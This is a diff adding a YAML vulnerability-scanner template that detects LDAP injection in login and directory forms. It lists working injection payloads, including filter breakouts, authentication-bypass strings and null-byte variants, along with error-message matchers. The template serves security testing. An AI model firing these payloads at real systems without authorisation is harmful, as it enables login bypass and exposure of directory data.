@@ -1,0 +1,58 @@
+# templates/ldap-injection/ldap-injection-basic.yaml
+id: ldap-injection-basic
+info:
+  name: LDAP Injection Vulnerability Detection
+  author: webx-elite
+  severity: high
+  description: Tests for LDAP injection vulnerabilities in authentication and directory services
+  tags:
+    - ldap-injection
+    - injection
+    - authentication
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 8.2
+    cwe-id: CWE-90
+
+vulnerability_type: ldap-injection
+
+request:
+  - method: POST
+    path: "{{BaseURL}}"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "{{parameter}}={{ldap_payload}}"
+    
+    matchers:
+      - type: word
+        words:
+          - "Microsoft OLE DB Provider for ODBC Drivers error"
+          - "Invalid DN syntax"
+          - "Protocol error occurred"
+          - "LDAP: error code 1"
+          - "javax.naming.PartialResultException"
+          - "javax.naming.directory.InvalidSearchFilterException"
+        part: body
+        condition: or
+
+payloads:
+  # Basic LDAP injection
+  - "*"
+  - "*)(uid=*))(|(uid=*"
+  - "*)(|(password=*))"
+  - "*)((|(password=*"
+  
+  # Authentication bypass
+  - "*)(|(objectClass=*)"
+  - "admin)(&(objectClass=user)(|(cn=*))"
+  - "*))%00"
+  - "admin)(&(objectClass=user)(userPassword=*))"
+  
+  # Boolean-based
+  - "*)(&(objectClass=user)(cn=admin))"
+  - "*)(&(objectClass=user)(!(cn=admin)))"
+  - "*)(|(objectClass=*))(%00"
+
+encoders:
+  - url
+  - double_url
